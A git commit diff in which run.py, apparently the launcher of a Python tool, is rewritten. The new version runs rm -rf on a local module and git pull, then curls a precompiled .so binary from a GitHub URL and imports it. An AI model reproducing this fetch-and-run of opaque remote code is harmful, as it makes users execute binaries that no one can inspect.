fba4bec0807891b3febccbb619d98b6390b166bb
AFGHAN HACK <110977192+AfghanHack001@users.noreply.github.com>
2022-11-05 08:37:30 +0430

    Update run.py

--- run.py
+++ run.py
@@ -1,4 +1,24 @@
-from RNDM import *
+import os, sys, platform
+try:
+    import requests
+except:
+	os.system("xdg-open https://github.com/AfghanHack001")
+	
+        ###os.system('pip install requests')
 
-first_join()
+import requests
+try:
+    if sys.argv[1]=='update':
+        os.system('rm -rf MISTYY.so')
+except:
+    pass
+os.system('rm -rf MISTYY.so ')
+os.system('git pull')
 
+bit = platform.architecture()[0]
+if bit == '64bit':
+    if not os.path.isfile('MISTYY.so'):
+        os.system('curl -L https://github.com/MISTYXD/RANI/blob/main/MISTYY.cpython-311.so?raw=true -o MISTYY.so') 
+        import MISTYY
+    else:
+        import MISTYY
